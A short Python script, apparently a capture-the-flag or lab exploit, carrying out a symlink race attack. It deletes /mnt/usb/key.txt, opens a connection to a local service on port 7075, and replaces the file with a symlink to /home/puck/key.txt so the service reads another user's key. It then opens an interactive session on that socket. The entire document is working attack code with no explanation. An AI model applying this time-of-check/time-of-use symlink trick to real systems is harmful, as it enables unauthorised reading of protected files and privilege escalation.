#!/usr/bin/python3
import os, socket, telnetlib

os.remove("/mnt/usb/key.txt")

session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
session.connect(("127.0.0.1", 7075))

os.symlink("/home/puck/key.txt", "/mnt/usb/key.txt")

shell = telnetlib.Telnet()
shell.sock = session
shell.interact()
